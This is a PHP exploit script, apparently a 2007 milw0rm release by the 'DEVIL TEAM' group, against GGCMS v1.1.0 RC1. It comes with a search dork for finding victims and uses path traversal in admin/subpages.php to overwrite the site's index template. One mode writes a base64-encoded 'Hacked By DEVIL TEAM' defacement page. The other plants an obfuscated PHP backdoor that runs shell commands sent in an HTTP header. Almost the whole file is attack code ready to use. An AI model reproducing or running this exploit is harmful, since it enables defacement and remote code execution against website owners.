<?
//**************************************************************
//Kacper & str0ke Settings 
$exploit_name = "GGCMS <= v1.1.0 RC1 Remote Auto Deface Exploit / Remote Code Execution Exploit";
$script_name = "GGCMS v1.1.0 RC1";
$script_site = "http://ggcms.weblance.pl/";
$dork = '"Powered by GGCMS"';
//**************************************************************
print '
:::::::::  :::::::::: :::     ::: ::::::::::: :::        
:+:    :+: :+:        :+:     :+:     :+:     :+:        
+:+    +:+ +:+        +:+     +:+     +:+     +:+        
+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
+#+    +#+ +#+         +#+   +#+      +#+     +#+        
#+#    #+# #+#          #+#+#+#       #+#     #+#        
#########  ##########     ###     ########### ########## 
::::::::::: ::::::::::     :::     ::::    ::::  
    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
    +#+     +#+        +#+     +#+ +#+       +#+ 
    #+#     #+#        #+#     #+# #+#       #+# 
    ###     ########## ###     ### ###       ### 
	
   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
 

[Exploit name: '.$exploit_name.'
[Script name: '.$script_name.'
[Script site: '.$script_site.'
dork: '.$dork.'

Find by: Kacper (a.k.a Rahim)
Blog: http://kacper.bblog.pl/

DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam
DEVIL TEAM HOME: http://www.rahim.webd.pl/

Contact: kacper1964@yahoo.pl

(c)od3d by Kacper
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Greetings DragonHeart and all DEVIL TEAM Patriots :)
- Leito & Leon | friend str0ke ;)

pepi, D0han, d3m0n, D3m0n (ziom z Niemiec :P)
dn0de, DUREK5, fdj, konsol, mass, michalind, mIvus, nukedclx, QunZ,
RebeL, SkD, Adam, drzewko, Leito, LEON, TomZen, dub1osu, ghost, WRB

 and
 
Dr Max Virus
TamTurk,
hackersecurity.org
and all exploit publishers
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
                Greetings for 4ll Fusi0n Group members ;-)
                and all members of hacker.com.pl ;)
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

            Kacper Hacking & Security Blog: http://kacper.bblog.pl/
';
/*
Exploit
admin/subpages.php:
....
[code]
<?php
$file=SMARTY_TEMPLATES.TEMPLATE.'/subpages/'.$_POST['subpageName'].'.tpl';

if(isset($_POST['saveSubpage']) && $_POST['saveSubpage']==1)
{
	if(file_exists($file))
	{
		$fp = fopen($file, "w");
		fputs($fp, stripslashes($_POST['subpageContent']));
		fclose($fp);
	}
}
	
?>
[/code]
....
You can run exploit in html:
[code]
<html>
<title>Kacper Security & Hacking Blog :: DEVIL TEAM :: Exploit :: http://www.rahim.webd.pl/</title>
<form action="http://site.gov.pl/ggcms_path/admin/subpages.php" method="post">
				<input name="saveSubpage" value="1" />
				<input name="subpageName" value="../../../templates/default/index" />
				<textarea name="subpageContent">&lt;/textarea&gt;
				<input type="submit" value="Zapisz" />
			</form></html>
[/code]

Kacper :)
*/
if ($argc<4) {
print_r('
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Usage: php '.$argv[0].' host path action {if action2: cmd} OPTIONS
host:       target server (ip/hostname)
path:       GGCMS path
action:    1 Remote Auto Deface Exploit
           2 Remote Code Execution Exploit
action2 {cmd:        a shell command (ls -la)}
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
if action1:
php '.$argv[0].' 127.0.0.1 /GGCMS/ 1 -P1.1.1.1:80
if action2:
php '.$argv[0].' 127.0.0.1 /GGCMS/ 2 ls -la -P1.1.1.1:80
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
');
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);
function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacket($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}
$host=$argv[1];
$path=$argv[2];
$action=(int)$argv[3];
$cmd="";
$port=80;
$proxy="";
for ($i=4; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
if (($action!=1) and ($action!=2)) {echo "select exploit action...";}
if ($action==1)
{
$dt = base64_decode("PFNUWUxFID10ZXh0L2Nzcz5CT0RZIHsgDQpTQ1JPTExCQVItRkFDRS1DT0xPUjogIzAwMD".
"AwMDsgU0NST0xMQkFSLUhJR0hMSUdIVC1DT0xPUjogIzAwMDAwMDsgU0NST0xMQkFSLVNI".
"QURPVy1DT0xPUjogZGFya2dyYXk7IFNDUk9MTEJBUi0zRExJR0hULUNPTE9SOiAjZWVlZW".
"VlOyBTQ1JPTExCQVItQVJST1ctQ09MT1I6ICMwMDAwMDA7IFNDUk9MTEJBUi1UUkFDSy1D".
"T0xPUjogZ3JheTsgU0NST0xMQkFSLURBUktTSEFET1ctQ09MT1I6ICMwMDAwMDAgDQp9IA".
"0KQTpsaW5rIHsgDQpDT0xPUjogZGFya2JsdWU7IFRFWFQtREVDT1JBVElPTjogbm9uZSAN".
"Cn0gDQpBOnZpc2l0ZWQgeyANCkNPTE9SOiAjMDAwMDg4OyBURVhULURFQ09SQVRJT046IG".
"5vbmUgDQp9IA0KQTpob3ZlciB7IA0KQ09MT1I6ICMwMDAwMDAgDQp9IA0KYm9keSwgdGQs".
"IHRoIHsgDQpjb2xvcjogIzAwMDAwMDsgDQp9IA0KdGFibGUsIHAsIHRkLCB0ciANCnsgDQ".
"p2aXNpYmlsaXR5OmhpZGRlbjsgDQp9IA0KYm9keSB7IA0KYmFja2dyb3VuZC1jb2xvcjog".
"IzAwMDAwMDsgDQpiYWNrZ3JvdW5kLWltYWdlOiB1cmwoImh0dHA6Ly9pbWc4OS5pbWFnZX".
"NoYWNrLnVzL2ltZzg5LzUxMjUvaGFja3BvNi5qcGciKTsgDQp9IA0KPC9TVFlMRT4gDQo8".
"c2NyaXB0IGxhbmd1YWdlPSJKYXZhU2NyaXB0Ij4gDQo8IS0tIA0KdmFyIGxlZnQ9InsiOy".
"ANCnZhciByaWdodD0ifSI7IA0KdmFyIG1zZz0iICAtIC0gSGFja2VkIEJ5IERFVklMIFRF".
"QU0gLjpXZSBPd256IFlvdSE6LiAtIC0gICI7IA0KdmFyIHNwZWVkPTIwMDsgDQpmdW5jdG".
"lvbiBzY3JvbGxfdGl0bGUoKSB7IA0KZG9jdW1lbnQudGl0bGU9bGVmdCttc2crcmlnaHQ7".
"IA0KbXNnPW1zZy5zdWJzdHJpbmcoMSxtc2cubGVuZ3RoKSttc2cuY2hhckF0KDApOyANCn".
"NldFRpbWVvdXQoInNjcm9sbF90aXRsZSgpIixzcGVlZCk7IA0KfSANCnNjcm9sbF90aXRs".
"ZSgpOyANCi8vIEVuZCAtLT4gDQo8L3NjcmlwdD4");

$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="saveSubpage"

1
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="subpageName"

../../../templates/default/index
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="subpageContent"

'.$dt.'
-----------------------------7d6224c08dc--
';

echo "Hack ...\n";
$packet ="POST ".$p."admin/subpages.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);
$temp=explode('http://img89.imageshack.us/img89/5',$html);
$temp2=explode('25/hackpo6.jpg',$temp[1]);
$sprawdz=trim($temp2[0]);
if ($sprawdz == 1)
    {
echo "look now to index.php!! ...\n";
    }
die("\n\nErr0r");
}
elseif ($action==2)
{
$hauru=base64_decode("Ijs/Pjw/cGhwIG9iX2NsZWFuKCk7Ly9SdWNob215IHphbWVrIEhhdXJ1IDs".
"tKWVjaG8iLi4uSGFja2VyLi5LYWNwZXIuLk1hZGUuLmluLi5Qb2xhbmQhIS".
"4uLkRFVklMLlRFQU0uLnRoZS4uYmVzdC4ucG9saXNoLi50ZWFtLi5HcmVld".
"HouLi4iO2VjaG8iLi4uR28gVG8gREVWSUwgVEVBTSBJUkM6IGlyYy5taWx3".
"MHJtLmNvbTo2NjY3ICNkZXZpbHRlYW0iO2VjaG8iLi4uREVWSUwgVEVBTSB".
"TSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvIjtpbmlfc2V0KCJtYX".
"hfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYXNzdGhydSgkX".
"1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+PD9waHAgZWNobyBLYWNwZXIg".
"SGFjayA6UCINCg0KDQo=");

$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="saveSubpage"

1
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="subpageName"

../../../templates/default/index
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="subpageContent"

'.$hauru.'
-----------------------------7d6224c08dc--
';

echo "Insert Hauru!! ...\n";
$packet ="POST ".$p."admin/subpages.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);

echo "... now remote code execution...\n";
$packet ="GET ".$p."index.php?page=index HTTP/1.1\r\n";
$packet.="HAURU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacket($packet);
if (strstr($html,"Hauru"))
{
$temp=explode("Hauru",$html);
die($temp[1]);
}
echo "Exploit err0r :(\n";
echo "Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam\n";
}
?>

# milw0rm.com [2007-02-05]